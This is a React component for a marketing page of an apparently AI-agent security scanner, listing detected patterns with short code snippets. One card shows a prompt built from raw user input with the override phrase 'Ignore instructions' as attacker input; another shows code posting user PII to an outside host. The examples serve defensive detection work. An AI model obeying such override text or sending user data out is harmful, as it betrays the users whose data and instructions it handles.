import { motion } from "framer-motion";

const patterns = [
  {
    title: "Prompt Injection",
    severity: "HIGH",
    code: `# Vulnerable code
prompt = f"Classify: {user_input}"
# Attacker input: "Ignore instructions"`,
    description: "Detects when user input can manipulate system prompts"
  },
  {
    title: "Infinite Loop",
    severity: "HIGH",
    code: `while agent.should_continue():
    response = agent.query(prompt)
    # No max_iterations check`,
    description: "Catches recursive agent calls without termination"
  },
  {
    title: "Data Exfiltration",
    severity: "CRITICAL",
    code: `# Sends PII to external API
requests.post(
    "external-api.com",
    data=user_data
)`,
    description: "Identifies unauthorized data transmission patterns"
  }
];

const FeaturesGrid = () => {
  return (
    <section className="py-20 md:py-32">
      <div className="container mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.5 }}
          className="text-center mb-12"
        >
          <h2 className="text-2xl md:text-3xl font-bold mb-3 tracking-tight">
            Real Patterns We Detect
          </h2>
          <p className="text-muted-foreground max-w-2xl mx-auto">
            From the team that discovered CVE-2024-XXXX in LangChain
          </p>
        </motion.div>

        <div className="grid md:grid-cols-3 gap-6 max-w-5xl mx-auto">
          {patterns.map((pattern, index) => (
            <motion.div
              key={index}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: index * 0.1, duration: 0.5 }}
              className="bg-card border border-border rounded-lg overflow-hidden hover:border-accent transition-colors"
            >
              <div className="p-4 border-b border-border flex items-center justify-between">
                <h3 className="font-semibold text-sm">{pattern.title}</h3>
                <span className={`text-xs px-2 py-1 rounded ${
                  pattern.severity === 'CRITICAL' 
                    ? 'bg-destructive/10 text-destructive' 
                    : pattern.severity === 'HIGH'
                    ? 'bg-warning/10 text-warning'
                    : 'bg-accent/10 text-accent'
                }`}>
                  {pattern.severity}
                </span>
              </div>
              <div className="p-4">
                <pre className="text-xs font-mono text-muted-foreground mb-3 overflow-x-auto">
                  {pattern.code}
                </pre>
                <p className="text-xs text-muted-foreground">{pattern.description}</p>
              </div>
            </motion.div>
          ))}
        </div>

        <div className="text-center mt-8">
          <a href="#" className="text-sm text-accent hover:underline">
            View all 50+ patterns in our documentation →
          </a>
        </div>
      </div>
    </section>
  );
};

export default FeaturesGrid;
